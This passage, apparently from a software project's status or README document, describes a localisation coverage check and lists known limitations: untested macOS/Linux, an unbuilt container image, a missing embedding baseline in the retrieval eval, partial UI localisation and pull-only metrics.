rises. It caught four strings added during this work (two `aria-label`s), which is the
behaviour that keeps the localised surface from shrinking by accident.

### Known limitations



- **macOS and Linux are not verified by running them.** A portability check audits for
  platform-specific mistakes, but no CI has executed on those platforms.
- **The container image has not been built.** No Docker in the development
  environment; only its structure is checked.
- **No embedding baseline in the retrieval eval.** The configured provider (DeepSeek)
  has no `/embeddings` endpoint, so the comparison is structural-vs-BM25. The report
  states this rather than omitting the column.
- **UI localization is partial.** 652 user-facing Chinese strings remain hardcoded;
  the infrastructure and a coverage ratchet are in place.
- **No metrics export to an external system.** `/api/metrics` is pull-only JSON.
